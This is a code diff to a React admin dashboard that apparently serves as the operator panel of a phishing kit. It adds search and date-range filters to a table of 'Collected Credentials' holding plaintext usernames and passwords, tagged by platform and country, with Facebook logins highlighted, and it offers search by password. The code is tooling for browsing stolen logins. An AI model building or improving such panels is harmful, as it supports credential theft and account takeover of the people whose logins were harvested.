@@ -22,6 +22,7 @@ export default function AdminDashboard() {
     continents: {}
   });
   const [searchTerm, setSearchTerm] = useState('');
+  const [dateRange, setDateRange] = useState({ start: '', end: '' });
   const [filter, setFilter] = useState('all');
   const [darkMode, setDarkMode] = useState(false);
   const [platformCounts, setPlatformCounts] = useState({});
@@ -269,6 +270,36 @@ export default function AdminDashboard() {
     return credentials.filter(user => user.platform === platform);
   }
   
+  // Add this function to filter credentials
+  const getFilteredCredentials = () => {
+    if (!credentials) return [];
+    
+    return credentials.filter(cred => {
+      // Search filter
+      const searchMatch = searchTerm === '' || 
+        (cred.username && cred.username.toLowerCase().includes(searchTerm.toLowerCase())) ||
+        (cred.password && cred.password.toLowerCase().includes(searchTerm.toLowerCase())) ||
+        (cred.country && cred.country.toLowerCase().includes(searchTerm.toLowerCase()));
+      
+      // Date range filter
+      let dateMatch = true;
+      if (dateRange.start && dateRange.end) {
+        const credDate = new Date(cred.login_time || cred.created_at);
+        const startDate = new Date(dateRange.start);
+        const endDate = new Date(dateRange.end);
+        endDate.setHours(23, 59, 59); // Include the full end day
+        dateMatch = credDate >= startDate && credDate <= endDate;
+      }
+      
+      return searchMatch && dateMatch;
+    });
+  };
+  
+  useEffect(() => {
+    document.body.classList.toggle('dark-mode', darkMode);
+    localStorage.setItem('darkMode', darkMode);
+  }, [darkMode]);
+  
   return (
     <>
       <Head>
@@ -325,8 +356,11 @@ export default function AdminDashboard() {
             <header className="dashboard-header">
               <h1><i className="fas fa-chart-line"></i> Admin Dashboard</h1>
               <div className="header-actions">
-                <button onClick={toggleDarkMode} className="icon-button">
-                  <i className={`fas fa-${darkMode ? 'sun' : 'moon'}`}></i>
+                <button 
+                  onClick={() => setDarkMode(!darkMode)}
+                  className={styles.darkModeToggle}
+                >
+                  {darkMode ? 'Light Mode' : 'Dark Mode'}
                 </button>
                 <button onClick={handleLogout} className="logout-button">
                   <i className="fas fa-sign-out-alt"></i> Logout
@@ -400,6 +434,32 @@ export default function AdminDashboard() {
                   </div>
                 </div>
                 
+                <div className={styles.filterControls}>
+                  <input
+                    type="text"
+                    placeholder="Search username, password, country..."
+                    value={searchTerm}
+                    onChange={(e) => setSearchTerm(e.target.value)}
+                    className={styles.searchInput}
+                  />
+                  
+                  <div className={styles.dateRangeContainer}>
+                    <label>From:</label>
+                    <input 
+                      type="date" 
+                      value={dateRange.start}
+                      onChange={(e) => setDateRange({...dateRange, start: e.target.value})}
+                    />
+                    
+                    <label>To:</label>
+                    <input 
+                      type="date" 
+                      value={dateRange.end}
+                      onChange={(e) => setDateRange({...dateRange, end: e.target.value})}
+                    />
+                  </div>
+                </div>
+                
                 <div className="data-container">
                   <div className="data-header">
                     <h2><i className="fas fa-table"></i> Collected Credentials</h2>
@@ -454,7 +514,7 @@ export default function AdminDashboard() {
                         </tr>
                       </thead>
                       <tbody>
-                        {filterCredentials().map((cred, index) => (
+                        {getFilteredCredentials().map((cred, index) => (
                           <tr key={cred.id || index} className={
                             (cred.platform && cred.platform.includes('facebook')) || (cred.username && cred.username.includes('(FB)')) 
                               ? 'facebook-row' 
